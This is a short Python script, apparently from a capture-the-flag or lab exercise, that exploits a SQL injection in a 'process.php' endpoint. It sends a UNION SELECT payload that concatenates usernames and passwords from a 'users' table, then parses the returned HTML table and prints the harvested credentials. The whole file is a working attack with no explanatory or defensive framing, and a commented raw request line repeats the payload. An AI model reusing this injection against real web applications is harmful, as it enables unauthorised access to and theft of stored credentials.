import requests
import pandas

SERVER="http://localhost:4444"
# SERVER="http://10.1.5.2/:80"

#GET /process.php?user='+UNION+SELECT+1,'',CONCAT(user,+'+-+',pass)+FROM+users%23&pass=lmao&amount=lmao&drop=balance HTTP/1.1
r = requests.get(SERVER + "/process.php", {
    'user': "' UNION SELECT 1,'',CONCAT(user, ' - ',pass) FROM users #'",
    'pass': "",
    'amount': "",
    'drop': "balance"
})

tables = pandas.read_html(r.text)

table = tables[0]

print("Found users:")
for row in table.iterrows():
    if "Total" not in row[1][0]:
        print(row[1][1])